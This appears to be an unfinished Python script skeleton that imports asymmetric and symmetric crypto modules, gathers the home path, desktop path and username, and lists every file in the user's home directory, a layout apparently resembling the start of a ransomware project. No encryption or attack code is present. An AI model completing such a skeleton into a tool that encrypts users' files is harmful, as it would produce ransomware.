#!/bin/bash/env python
# coding=UTF-8

import asymmetric
import get_files
import symmetric
import enviroment





def menu():

    # enviroment paths
    home = enviroment.get_home_path()
    desktop = enviroment.get_desktop_path()
    username = enviroment.get_username()

    # get the files in the home directory
    # /home/$USER
    files = get_files.find_files(home)

    





if __name__ == "__main__":
    menu()


    